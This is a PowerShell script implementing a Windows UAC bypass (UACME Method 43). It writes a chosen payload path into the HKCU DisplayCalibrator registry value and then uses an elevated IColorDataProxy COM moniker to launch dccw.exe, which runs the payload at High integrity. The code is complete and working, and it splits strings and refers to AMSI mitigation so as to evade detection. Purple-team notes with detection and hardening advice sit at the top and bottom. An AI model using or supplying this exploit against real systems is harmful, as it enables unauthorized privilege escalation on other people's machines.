<#
.SYNOPSIS
    UAC bypass via IColorDataProxy COM + DisplayCalibrator registry (UACME Method 43).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ Two-stage COM-and-registry bypass:                                       │
    │                                                                         │
    │ Stage 1 — Registry plant (no elevation needed):                         │
    │   Write payload path to the Display Calibration registry value at:      │
    │   HKCU:\Software\Microsoft\Windows NT\CurrentVersion\ICM\Calibration   │
    │     DisplayCalibrator = <Payload>                                        │
    │   This key is user-writable at Medium integrity.                        │
    │                                                                         │
    │ Stage 2 — COM elevation via IColorDataProxy:                            │
    │   The IColorDataProxy COM object                                         │
    │     CLSID: {D2E7041B-2927-42fb-8E9F-7CE93B6DC937}                      │
    │   is in the COMAutoApprovalList and can be instantiated elevated via    │
    │   the elevation moniker without a UAC dialog.                           │
    │   Calling IColorDataProxy::LaunchDccw(NULL) starts dccw.exe            │
    │   (Display Color Calibration Wizard) with a High-integrity token.       │
    │                                                                         │
    │ Stage 3 — Elevated execution:                                           │
    │   dccw.exe reads HKCU\...\\ICM\Calibration\DisplayCalibrator and        │
    │   executes the registered calibration application — our payload.        │
    │                                                                         │
    │ Combining COM elevation with a registry read that dccw.exe performs    │
    │ at High integrity achieves payload execution without spawning anything  │
    │ directly from PowerShell with elevated privileges.                      │
    └─────────────────────────────────────────────────────────────────────────┘

    IColorDataProxy vtable layout (from UACME elvint.h):
      Slots 3–13 : Method1–Method11  (stubbed out)
      Slot 14    : LaunchDccw(HWND)  ← we call this

    CLSID  : {D2E7041B-2927-42fb-8E9F-7CE93B6DC937}  (ColorDataProxy)
    Moniker: Elevation:Administrator!new:{D2E7041B-…}

    Affected OS    : Windows 7 RTM (7600) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry write to HKCU\…\ICM\Calibration\DisplayCalibrator
      (uncommon — only written during legitimate display calibration)
    • Process: dccw.exe spawning <payload binary> at High integrity
    • DCOM: CoGetObject with D2E7041B-… CLSID elevation moniker
    • ETW: Add-Type JIT compilation of IColorDataProxy interface

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 43)
                   Oddvar Moe / api0cradle derivative (DccwCOM)

.PARAMETER Payload
    Full path to the executable to run elevated.
    Note: dccw.exe will ShellExecute this path — it must be a valid binary.
    Works best with fully-qualified paths (e.g. C:\Windows\System32\cmd.exe).

.PARAMETER Timeout
    Seconds to wait for dccw.exe to launch and read the registry (default: 5).

.EXAMPLE
    Invoke-DccwCOMBypass -Payload "C:\Windows\System32\cmd.exe"

.EXAMPLE
    $ps = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    Invoke-DccwCOMBypass -Payload $ps -Timeout 6

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    dccw.exe executes the DisplayCalibrator value directly as a process;
    command-line arguments embedded in the path string should work, but
    wrapping in cmd.exe is more reliable if arguments are needed.
    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
    AMSI mitigation and preflight checks.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [int]$Timeout = 5
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── Stage 1: Plant DisplayCalibrator registry value ───────────────────
# Registry path constructed in segments
$xRegBase  = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\ICM\'
$xRegSub   = 'Calibration'
$xRegPath  = $xRegBase + $xRegSub
$xRegValue = 'Display' + 'Calibrator'

# Backup existing value if present
$xOldValue = $null
try {
    $xOldValue = Get-ItemPropertyValue -Path $xRegPath -Name $xRegValue -EA Stop
} catch {}

try {
    if (-not (Test-Path $xRegPath)) {
        New-Item -Path $xRegPath -Force | Out-Null
    }
    Set-ItemProperty -Path $xRegPath -Name $xRegValue -Value $Payload -Force
    Write-Verbose '[DccwCOM] DisplayCalibrator registry value written.'
}
catch {
    Write-Warning "[DccwCOM] Registry write failed: $_"
    return
}
#endregion

#region ── Stage 2: COM interface definition (IColorDataProxy) ───────────────
# CLSID split to avoid single-contiguous string static detection
$xD1 = 'D2E7041B'; $xD2 = '2927'; $xD3 = '42fb'; $xD4 = '8E9F'; $xD5 = '7CE93B6DC937'
$xColorClsid = "$xD1-$xD2-$xD3-$xD4-$xD5"
$xMoniker    = 'Elevation:Administrator!new:{' + $xColorClsid + '}'

# IColorDataProxy vtable: 11 stub methods + LaunchDccw (slot 14 in full vtable)
$xCSharp = @'
using System;
using System.Runtime.InteropServices;
namespace ColorProxy {
    [ComImport]
    [Guid("D2E7041B-2927-42fb-8E9F-7CE93B6DC937")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IColorDataProxy {
        [PreserveSig] int M1();
        [PreserveSig] int M2();
        [PreserveSig] int M3();
        [PreserveSig] int M4();
        [PreserveSig] int M5();
        [PreserveSig] int M6();
        [PreserveSig] int M7();
        [PreserveSig] int M8();
        [PreserveSig] int M9();
        [PreserveSig] int M10();
        [PreserveSig] int M11();
        [PreserveSig] int LaunchDccw(IntPtr hwnd);
    }
    public static class ColorProxyHelper {
        [StructLayout(LayoutKind.Sequential)]
        struct BindOpts3 {
            public uint cbStruct, grfFlags, grfMode, dwTickCountDeadline,
                        dwTrackFlags, dwClassContext, locale;
            public IntPtr pServerInfo, hwnd;
        }
        [DllImport("ole32.dll", CharSet = CharSet.Unicode)]
        static extern int CoGetObject(
            string pszName, ref BindOpts3 opts, ref Guid riid, out IntPtr ppv);

        public static IColorDataProxy Elevate(string moniker) {
            var opts = new BindOpts3();
            opts.cbStruct       = (uint)Marshal.SizeOf(opts);
            opts.dwClassContext = 4;
            var riid = new Guid("D2E7041B-2927-42fb-8E9F-7CE93B6DC937");
            IntPtr pUnk;
            int hr = CoGetObject(moniker, ref opts, ref riid, out pUnk);
            if (hr < 0) throw new Exception("CoGetObject 0x" + hr.ToString("X8"));
            var obj = (IColorDataProxy)Marshal.GetObjectForIUnknown(pUnk);
            Marshal.Release(pUnk);
            return obj;
        }
    }
}
'@

try {
    if (-not ([System.Management.Automation.PSTypeName]'ColorProxy.IColorDataProxy').Type) {
        Add-Type -TypeDefinition $xCSharp -ErrorAction Stop
    }
}
catch {
    Write-Warning "[DccwCOM] Add-Type failed: $_"
    # Restore old value
    if ($xOldValue) {
        Set-ItemProperty -Path $xRegPath -Name $xRegValue -Value $xOldValue -Force
    } else {
        Remove-ItemProperty -Path $xRegPath -Name $xRegValue -EA SilentlyContinue
    }
    return
}
#endregion

#region ── Stage 3: Trigger dccw.exe via elevated COM ────────────────────────
try {
    $xProxy = [ColorProxy.ColorProxyHelper]::Elevate($xMoniker)
    if (-not $xProxy) {
        Write-Warning '[DccwCOM] CoGetObject returned null.'
        return
    }
    # LaunchDccw(IntPtr.Zero) — starts dccw.exe with High integrity
    $xHr = $xProxy.LaunchDccw([IntPtr]::Zero)
    Write-Verbose (("[DccwCOM] LaunchDccw HRESULT: 0x{0:X8}") -f $xHr)
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($xProxy) | Out-Null

    Start-Sleep -Seconds $Timeout
    Write-Verbose '[DccwCOM] Wait complete — payload should have run.'
}
catch {
    Write-Warning "[DccwCOM] COM call failed: $_"
}
finally {
    # ── Cleanup: restore or delete the DisplayCalibrator value ──
    try {
        if ($null -ne $xOldValue) {
            Set-ItemProperty -Path $xRegPath -Name $xRegValue -Value $xOldValue -Force
            Write-Verbose '[DccwCOM] Registry value restored to original.'
        }
        else {
            Remove-ItemProperty -Path $xRegPath -Name $xRegValue -ErrorAction SilentlyContinue
            Write-Verbose '[DccwCOM] Registry value removed.'
        }
    } catch {}
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

UNIQUE DETECTION PROFILE VS OTHER METHODS:
  This method leaves a footprint in a registry path that is not commonly
  monitored: HKCU\...\\ICM\Calibration\DisplayCalibrator.
  The key is only written by legitimate display calibration workflows
  (ICC profile management, Windows Display Calibration tool).
  A write to this key from a non-display-management context is highly
  anomalous and a strong detection signal IF monitored.

EXPECTED DETECTIONS:
  ● DCOM: CoGetObject with D2E7041B-… CLSID elevation moniker
  ● Process: dccw.exe spawning <payload>  (dccw normally exits cleanly)
  ● Registry: DisplayCalibrator value write in ICM\Calibration

WHAT MAY EVADE:
  ● The DisplayCalibrator registry path is unlikely to be in standard
    CS built-in IOA rulesets (less commonly known than ms-settings)
  ● dccw.exe is a rarely-run binary; process-creation alerts may not
    be tuned to watch its children specifically

KEY TEST QUESTIONS FOR BLUE TEAM:
  1. Is HKCU\…\ICM\Calibration\DisplayCalibrator in any monitored path?
  2. Does dccw.exe appear in CS process-ancestry allow/deny logic?
  3. Does the D2E7041B CLSID COM elevation trigger a CS indicator?

HARDENING RECOMMENDATIONS:
  ● SACL on HKCU\...\\ICM\Calibration
  ● Monitor dccw.exe child processes (Sysmon EID 1 / CS process tree)
  ● AlwaysNotify UAC eliminates this method entirely

════════════════════════════════════════════════════════════════════════════════
#>
